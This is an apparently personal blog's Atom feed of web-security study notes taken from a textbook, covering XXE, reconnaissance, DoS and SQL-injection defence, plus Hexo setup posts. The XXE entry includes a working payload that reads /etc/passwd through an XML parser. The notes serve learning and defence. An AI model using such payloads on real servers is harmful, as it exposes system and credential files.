<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>caketi</title>
  
  <subtitle>Ultraman Orb(红凯)</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-09-19T16:02:26.811Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>caketi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XXE-notes-intro-level</title>
    <link href="http://example.com/2020/09/19/XXE-notes-intro-level/"/>
    <id>http://example.com/2020/09/19/XXE-notes-intro-level/</id>
    <published>2020-09-19T15:46:13.573Z</published>
    <updated>2020-09-19T16:02:26.811Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><ul><li><strong><em>a classification of attack that is often very simple to execute, but with devastating results.Relies on improperly configured XML parser within an application’s code</em></strong></li><li>an API endpoint that accepts an XML payload</li><li><strong><em>XML-like formats include SVG, HTML/DOM, PDF(XPDF), and RTF</em></strong></li><li>magic behind — XML specification includes a special annotation for importing external files. This special directive, called an external entity, is interpreted on the machine on which the XML file is evaluated. <blockquote><p>This means that a spcially crafted XML payload sent to a server’s XML pareser could result in compromsing files in that servers’s file structure.</p></blockquote></li><li>used to compromise files from other users</li><li>access files like /etc/shadow – store important credentials required for a Univ-based server to function properly<h3 id="Direct-XXE"><a href="#Direct-XXE" class="headerlink" title="Direct XXE"></a>Direct XXE</h3>In direct XXE, an XML object is sent to the server with an external entity flag. It is<br>then parsed, and a result is returned that includes the external entity <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"> A simple button. Calls the <span class="function"><span class="keyword">function</span> `<span class="title">screenshot</span>(<span class="params"></span>)` <span class="title">when</span> <span class="title">clicked</span>.</span></span><br><span class="line"><span class="function"> --&gt;</span></span><br><span class="line"><span class="function">&lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">id</span>=&quot;<span class="title">screenshot</span>-<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">onclick</span>=&quot;<span class="title">screenshot</span>(<span class="params"></span>)&quot;&gt;</span></span><br><span class="line"><span class="function"> <span class="title">Send</span> <span class="title">Screenshot</span> <span class="title">to</span> <span class="title">Support</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="function">/*</span></span><br><span class="line"><span class="function"> * <span class="title">Collect</span> <span class="title">HTML</span> <span class="title">DOM</span> <span class="title">from</span> <span class="title">the</span> `<span class="title">content</span>` <span class="title">element</span> <span class="title">and</span> <span class="title">invoke</span> <span class="title">an</span> <span class="title">XML</span></span></span><br><span class="line"><span class="function"> * <span class="title">parser</span> <span class="title">to</span> <span class="title">convert</span> <span class="title">the</span> <span class="title">DOM</span> <span class="title">text</span> <span class="title">to</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">XML</span> <span class="title">over</span> <span class="title">HTTP</span> <span class="title">to</span> <span class="title">a</span> <span class="title">function</span> <span class="title">that</span> <span class="title">will</span> <span class="title">generate</span> <span class="title">a</span> <span class="title">screenshot</span></span></span><br><span class="line"><span class="function"> * <span class="title">from</span> <span class="title">the</span> <span class="title">provided</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">screenshot</span> <span class="title">to</span> <span class="title">support</span> <span class="title">staff</span> <span class="title">for</span> <span class="title">further</span> <span class="title">analysis</span>.</span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="title">screenshot</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to convert the `content` element to XML.</span></span><br><span class="line"><span class="comment"> * Catch if this process fails—generally this should succeed</span></span><br><span class="line"><span class="comment"> * because HTML is a subset of XML.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;content&#x27;</span>).innerHTML;</span><br><span class="line"> <span class="keyword">const</span> serializer = <span class="keyword">new</span> XMLSerializer();</span><br><span class="line"> <span class="keyword">const</span> dom = serializer.serializeToString(div);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Once the DOM has been converted to XML, generate a request to</span></span><br><span class="line"><span class="comment"> * an endpoint that will convert the XML to an image. Hence</span></span><br><span class="line"><span class="comment">142 | Chapter 12: XML External Entity (XXE)</span></span><br><span class="line"><span class="comment"> * resulting in a screenshot.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"> <span class="keyword">const</span> url = <span class="string">&#x27;https://util.mega-bank.com/screenshot&#x27;</span>;</span><br><span class="line"> <span class="keyword">const</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line"> data.append(<span class="string">&#x27;dom&#x27;</span>, dom);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the conversion of XML -&gt; image is successful,</span></span><br><span class="line"><span class="comment"> * send the screenshot to support for analysis.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Else alert the user the process failed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> sendScreenshotToSupport(xhr.responseText, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) &#123; alert(<span class="string">&#x27;could not send screenshot.&#x27;</span>) &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123; alert(<span class="string">&#x27;screenshot sent to support!&#x27;</span>); &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> xhr.send(data);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warn the user if their browser is not compatible with this feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> alert(Your browser does not support <span class="built_in">this</span> functionality. Consider upgrading.</span><br><span class="line"> );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><blockquote><ol><li>The browser converts the current user’s view (via the DOM) to XML.</li><li>The browser sends this XML to a service which converts it to a JPG.</li><li>The browser sends that JPG to a member of MegaBank support via another API.</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmltojpg <span class="keyword">from</span> <span class="string">&#x27;./xmltojpg&#x27;</span></span><br><span class="line"><span class="comment">/*Convert an XML to a JPG image.</span></span><br><span class="line"><span class="comment"> *Return the image data to the requester</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">app.post(<span class="string">&#x27;/screenshot&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.body.dom) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">    xmltojpg.convert(req.body.dom)</span><br><span class="line">    .then(<span class="function">(<span class="params">err, jpg</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;<span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">        <span class="keyword">return</span> res.send(jpg)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>To convert the XML file to a JPG file, it must go through an XML parser. To be a valid<br>XML parser, it must follow the XML spec.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utilAPI <span class="keyword">from</span> <span class="string">&#x27;./utilAPI&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a new XML HTTP request targeting the XML -&gt; JPG utility API.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, utilAPI.url + <span class="string">&#x27;/screenshot&#x27;</span>)</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Provide a manually crafted XML string hat makes use of the external entity functionality in many XML parsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> rawXMLString = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;xxe;&lt;/xxe&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === XMLHttpRequest.DONE &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="comment">// chekc response data here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// send the request to the XML -&gt; JPG utility API endpoint</span></span><br><span class="line">xhr.send(rawXMLString)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;em&gt;a classification of attack that is often very simple to execute, but with devastating results.Reli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Github host 配置</title>
    <link href="http://example.com/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/</id>
    <published>2020-09-19T15:00:39.637Z</published>
    <updated>2020-09-19T15:57:32.140Z</updated>
    
    <content type="html"><![CDATA[<p>修改本地的hosts文件，建立对github的解析：</p><p>C:\Windows\System32\drivers\etc\hosts</p><p>添加：</p><p>　　IP　　<a href="https://www.github.com/">https://www.github.com</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;修改本地的hosts文件，建立对github的解析：&lt;/p&gt;
&lt;p&gt;C:\Windows\System32\drivers\etc\hosts&lt;/p&gt;
&lt;p&gt;添加：&lt;/p&gt;
&lt;p&gt;　　IP　　&lt;a href=&quot;https://www.github.com/&quot;&gt;https:/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Caketi  on the way</title>
    <link href="http://example.com/2020/09/19/Caketi-on-the-way/"/>
    <id>http://example.com/2020/09/19/Caketi-on-the-way/</id>
    <published>2020-09-19T13:29:19.075Z</published>
    <updated>2020-09-19T16:02:33.576Z</updated>
    
    <content type="html"><![CDATA[<p>进来看看？</p><a id="more"></a><h2 id="notes-about-caketi"><a href="#notes-about-caketi" class="headerlink" title="notes about caketi."></a>notes about caketi.</h2><p>Web Application Reconnaissance<br>Due to the increasing size and complexity of modern web applications, a first step in<br>finding application vulnerabilities is properly mapping an application and evaluating<br>each major functional component for architectural or logical risks. Proper application<br>recon is an essential first step prior to attacking a web application. Good recon will<br>provide you with a deep understanding of the target web application, which can be<br>used both for prioritizing attacks and avoiding detection.<br>Recon skills give you insight into how a qualified attacker would attack your web<br>application. This gives you the added benefit of being able to prioritize defenses, if<br>you are an application owner. Due to the ever-increasing complexity of modern web<br>applications, your recon skills may be limited by your engineering skills. As a result,<br>recon and engineering expertise go hand in hand.<br>The structure of modern web applications<br>• Unlike web applications 20 years ago, today’s web applications are built on many<br>layers of technology, and typically built with extensive server-to-user and userto-user functionality. Most applications use many forms of persistence, storing<br>data on both the server and the client (typically a browser). Because of this, the<br>potential surface area of any web application is quite broad.<br>• The types of databases, display-level technology, and server-side software used in<br>modern web applications is built on top of the problems web applications have<br>encountered in the past. Largely, the modern application ecosystem is developed<br>with developer productivity and user experience in mind. Because of this, new<br>types of vulnerabilities have emerged that would not have been possible<br>beforehand.<br>Subdomains, APIs, and HTTP<br>• Mastery of web application reconnaissance will require you to know ways to fully<br>map the surface area of a web application. Because today’s web applications are<br>much more distributed than those of the past, you may need to become familiar<br>with (and find) multiple web servers prior to discovering exploitable code. Fur‐<br>thermore, the interactions between these web servers may assist you in not only<br>understanding the target application, but in prioritizing your attacks as well.<br>• At the application layer, most websites today use HTTP for communication<br>between client and server. However, new protocols are being developed and inte‐<br>grated into modern web applications. Web applications of the future may make<br>Web Application Reconnaissance | 283<br>heavy use of sockets or RTC, so making use of easily adaptable recon techniques<br>is essential.<br>Third-party dependencies<br>• Today’s web applications rely just as much on third-party integrations as they do<br>on first-party code. Sometimes, they rely on third-party integrations even more<br>than first-party code. These dependencies are not audited at the same standards<br>as first-party code, and as a result can be a good attack vector for a hacker.<br>• Using recon techniques, we can fingerprint specific versions of web servers,<br>client-side frameworks, CSS frameworks, and databases. Using these fingerprints,<br>we may be able to determine specific (vulnerable) versions to exploit.<br>Application architecture<br>• Proper evaluation of an application’s software architecture can lead to the discov‐<br>ery of widespread vulnerabilities that result from inconsistent security controls.<br>• Application security architecture can be used as a proxy for the quality of code in<br>an application—a signal that hackers take very seriously when evaluating which<br>application to focus their efforts on.<br>Offense<br>Cross-Site Scripting (XSS)<br>• At their core, XSS attacks are possible when an application improperly makes use<br>of user-provided inputs in a way that permits script execution.<br>• When traditional forms of XSS are properly mitigated via sanitization of DOM<br>elements, or at the API level (or both), it still may be possible to find XSS vulner‐<br>abilities. XSS sinks exist as a result of bugs in the browser DOM spec, and occa‐<br>sionally as a result of improperly implemented third-party integrations.<br>Cross-Site Request Forgery (CSRF)<br>• CSRF attacks take advantage of a trust relationship established between the<br>browser and the user. Because of the trusting nature of this relationship, an<br>improperly configured application may accept elevated privilege requests on<br>behalf of a user who inadvertently clicked a link or filled out a web form.<br>• If the low-hanging fruit (state-changing HTTP GET requests) are already fil‐<br>tered, then alternative methods of attack, such as web forms, should be<br>considered.<br>284 | Chapter 28: Part III Summary<br>XML External Entity (XXE)<br>• A weakness in the XML specification allows improperly configured XML parsers<br>to leak sensitive server files in response to a valid XML request payload.<br>• These vulnerabilities are often visible when a request accepts an XML or XMLlike payload directly from the client, but in more complicated applications, indi‐<br>rect XXE may be possible. Indirect XXE occurs when a server accepts a payload<br>from the user, then formulates an XML file to send to the XML parser, rather<br>than accepting an XML object directly.<br>Injection attacks<br>• Although SQL injection attacks are the most widely known and prepared for,<br>injection attacks can occur against any CLI utility a server makes use of in<br>response to an API request.<br>• SQL databases are (often) guarded well against injection. Automation is perfect<br>for testing well-known SQL injection attacks since the method of attack is so well<br>documented. If SQL injection fails, consider image compressors, backup utilities,<br>and other CLIs as potential targets.<br>Denial of service (DoS)<br>• DoS attacks come in all shapes and forms, ranging from annoying reductions in<br>server performance, all the way to complete interruption for legitimate users.<br>• DoS attacks can target regular expression evaluation engines, resourceconsuming server processes, as well as simply targeting standard application or<br>network functionality with huge amounts of traffic or requests.<br>Exploiting third-party dependencies<br>• Third-party dependencies are rapidly becoming one of the easiest attack vectors<br>for a hacker. This is due to a combination of factors, one of which is the fact that<br>third-party dependencies are often not audited as closely as first-party code.<br>• Open source CVE databases can be used to find previously reported, known vul‐<br>nerabilities in well-known dependencies, which can then be exploited against a<br>target application unless the application has been updated or manually patched.<br>Defense<br>Secure application architecture<br>• Writing a secure web application starts at the architecture phase. A vulnerability<br>discovered in this phase can cost as much as 60 times less than a vulnerability<br>found in production code.<br>Defense | 285<br>• Proper security architecture can result in application-wide mitigations for com‐<br>mon security risks, versus on-demand mitigations, which are more likely to be<br>inconsistent or forgotten.<br>Reviewing code for security<br>• After a secure application architecture has been decided upon, a proper secure<br>code review process should be implemented to prevent common and easy to spot<br>security bugs from being pushed into production.<br>• Security reviews at the code review stage are performed similarly to a traditional<br>code review. The main difference should be the type of bugs sought after, and<br>how files and modules are prioritized given a limited time frame.<br>Vulnerability discovery<br>• Ideally, vulnerabilities would be discovered prior to being deployed in a produc‐<br>tion application. Unfortunately, this is often not the case. But there are several<br>techniques you can take advantage of to reduce the number of production<br>vulnerabilities.<br>• In addition to implementing your own vulnerability discovery pipeline, you can<br>take advantage of third-party specialists in the form of bug bounty programs and<br>penetration testers. Not only can these services help you discover vulnerabilities<br>early, but they can also incentivize hackers to report vulnerabilities to your orga‐<br>nization for payment rather than selling found vulnerabilities on the black mar‐<br>ket or exploiting the vulnerability themselves.<br>Vulnerability management<br>• Once a vulnerability is found, it should be reproduced and triaged. The vulnera‐<br>bility should be scored based on its potential impact, so its fix can be properly<br>prioritized.<br>• A number of scoring algorithms exist for determining the severity of a vulnera‐<br>bility, with CVSS being the most well known. It is imperative that your organiza‐<br>tion implements a scoring algorithm. The scoring algorithm you choose is less<br>important than the fact that you use one. Each scoring system will have a margin<br>of error, but as long as it can distinguish the difference between a severe and lowrisk vulnerability, it will help you prioritize the way in which work is distributed<br>and bugs are fixed.<br>Defending against XSS attacks<br>• XSS attacks can be mitigated at a number of locations in a web application stack:<br>from the API level with sanitization functions, in the database, or on the client.<br>Because XSS attacks target the client, the client is the most important surface area<br>for mitigations to be implemented.<br>286 | Chapter 28: Part III Summary<br>• Simple XSS vulnerabilities can be eliminated with smart coding, in particular<br>when dealing with the DOM. More advanced XSS vulnerabilities, such as those<br>that rely on DOM sinks, are much harder to mitigate and may not even be repro‐<br>duceable! As a result, being aware of the most common sinks and sources for<br>each type of XSS is important.<br>Defending against CSRF attacks<br>• CSRF attacks take advantage of the trust relationship between a user and a<br>browser. As a result, CSRF attacks are mitigated by introducing additional rules<br>for state-changing requests that a browser cannot automatically confirm.<br>• Many mitigations against CSRF-style vulnerabilities exist, from simply eliminat‐<br>ing state-changing GET requests in your codebase, to implementing CSRF tokens<br>and requiring 2FA confirmation on elevated API requests.<br>Defending against XXE<br>• Most XXE attacks are both simple to exploit and simple to protect against. All<br>modern XML parsers provide configuration options that allow the external entity<br>to be disabled.<br>• More advanced XXE defense involves considering XML-like formats and XMLlike parsers, such as SVG, PDF, RTF, etc., and evaluating the implementation of<br>usage of those parsers in the same way you would a true XML parser to deter‐<br>mine if any crossover functionality is present.<br>Defending against injection<br>• Injection attacks that target SQL databases can be stopped or reduced with<br>proper SQL configuration and the proper generation of SQL queries (e.g., pre‐<br>pared statements).<br>• Injection attacks that target CLI interfaces are more difficult to detect and pre‐<br>vent against. When designing these tools, or implementing one, best practices<br>like the principle of least authority and separation of concerns should be strongly<br>considered.<br>Defending against DoS<br>• DoS attacks originating from a single attacker can be mitigated by scanning regu‐<br>lar expressions to detect backtracing problems, preventing user API calls from<br>accessing functions that consume significant server resources, and adding rate<br>limitations to these functions when required.<br>• DDoS attacks are more difficult to mitigate, but mitigations should start at the<br>firewall and work their way up. Blackholing traffic is a potential solution, as is<br>enlisting the help of a bandwidth management service that specializes in DDoS.<br>Defense | 287<br>Securing third-party dependencies<br>• Third-party dependencies are one of the security banes of modern web applica‐<br>tions. Because of their rampant inclusion in first-party applications, combined<br>with a mixed bag of security audits, third-party dependencies are a common<br>cause of an application’s demise.<br>• Third-party integrations should be integrated in a way that limits the integra‐<br>tions’ permissions and scope to what is necessary. In addition, the integrations<br>should be scanned and reviewed prior to integration. This includes looking into<br>CVE databases to determine if any other researchers or organizations have<br>reported vulnerabilities that affect the integration in question.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;进来看看？&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/09/19/hello-world/"/>
    <id>http://example.com/2020/09/19/hello-world/</id>
    <published>2020-09-19T13:15:17.187Z</published>
    <updated>2020-09-19T13:15:17.187Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Defending DoS</title>
    <link href="http://example.com/2020/09/18/defending%20Dos/"/>
    <id>http://example.com/2020/09/18/defending%20Dos/</id>
    <published>2020-09-18T11:35:17.341Z</published>
    <updated>2020-09-20T01:34:41.172Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote><p>As such, a first measure against DoS-style attacks should be building up a compre‐<br>hensive enough logging system in your server that all requests are logged alongside<br>their time to respond.<br>#Proteting Against Regex DoS<br>With a proper code review process, you can prevent regex DoS sinks (evil or mali‐<br>cious regex) from ever entering your codebase.</p></blockquote><p>DoS attacks come via two major archetypes: single attacker (DoS) and multiple<br>attackers (DDoS).<br>Most, but not all, DDoS attacks are performed by overwhelming server resources<br>rather than via bug exploitation. Because of this, countermeasures for DDoS may also<br>cause difficulty for legitimate users</p><p>Single-attacker DoS attacks, on the other hand, can be mitigated by smart application<br>architecture that prevents users from being able to take over application resources for<br>a long period of time.<br>Regular-expression-based DoS attacks can be mitigated by implementing a static<br>analysis tool (like a linter) to scan regular expressions in your codebase and warn if<br>any appear to be “evil” syntactically.<br>Because of their general ease of exploitation, DoS-style attacks are rampant through‐<br>out the web. Even if you don’t expect your application to be a target of DoS attacks,<br>you should implement anti-DoS mitigations once you can afford it just in case you<br>become a target in the future.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;blockquote&gt;
&lt;p&gt;As such, a first measure against DoS-style attacks should be building up a compre‐&lt;br&gt;hensive enough logg</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Defending Against Injection</title>
    <link href="http://example.com/2020/09/18/Defending%20Against%20%20Injection/"/>
    <id>http://example.com/2020/09/18/Defending%20Against%20%20Injection/</id>
    <published>2020-09-18T11:06:52.239Z</published>
    <updated>2020-09-20T01:38:23.428Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>In most modern web applications, SQL operations would occur past the server-side<br>routing level. This means we aren’t too interested in anything on the client.<br><strong><em>Remember that if data is persisting between devices and sessions, it is<br>either stored in server-side memory, disk (logs), or in a database.</em></strong><br>Furthermore, some server software makes use of a domain-specific language (DSL),<br>which could potentially make SQL calls on our behalf, although these calls would not<br>be structured similarly to a raw SQL call.</p></blockquote><p>If the SQL library is imported on a permodule basis, finding queries becomes as easy as searching for the import:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sql = <span class="built_in">require</span>(<span class="string">&#x27;mssql&#x27;</span>)</span><br><span class="line"><span class="comment">// OR</span></span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><em>On the other hand, if these libraries are declared globally, or inherited from a parent<br>class, the work for finding queries becomes a bit more difficult.</em></strong><br>Both of the two aforementioned SQL adapters for Node.js use a syntax that concludes<br>with a call to .query(x), but some adapters use a more literal syntax:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sql = <span class="built_in">require</span>(<span class="string">&#x27;sql&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> getUserByUsername = <span class="function"><span class="keyword">function</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> q = <span class="keyword">new</span> sql();</span><br><span class="line"> q.select(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line"> q.from(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"> q.where(<span class="string">`username = <span class="subst">$&#123;username&#125;</span>`</span>);</span><br><span class="line"> q.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">`username is : <span class="subst">$&#123;res&#125;</span>`</span>;</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>Prepared statements work by compiling the query first, with placeholder values for<br>variables. These are known as bind variables, but are often just referred to as place‐<br>holder variables. After compiling the query, the placeholders are replaced with the<br>values provided by the developer. As a result of this two-step process, the intention of<br>the query is set before any user-submitted data is considered.<br>With a prepared statement, because the intention is set in stone prior to the usersubmitted data being presented to the SQL interpreter, the query itself cannot change.<br>This means that a SELECT operation against users cannot be escaped and modified<br>into a DELETE operation by any means. An additional query cannot occur after the<br>SELECT operation if the user escapes the original query and begins a new one. Pre‐<br>pared statements eliminate most SQL injection risk and are supported by almost<br>every major SQL database: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, etc.<br>The only major trade-off between traditional SQL queries and prepared statements is<br>that of performance. Rather than one trip to the database, the database is provided<br>the prepared statement followed by the variables to inject after compilation and at<br>runtime of the query. In most applications, this performance loss will be minimal.</p></blockquote><p>In MySQL, prepared statements are quite simple:<br>PREPARE q FROM ‘SELECT name, barCode from products WHERE price &lt;= ?’;<br>SET @price = 12;<br>EXECUTE q USING @price;<br>DEALLOCATE PREPARE q;<br>In this prepared statement, we are querying the MySQL database for products 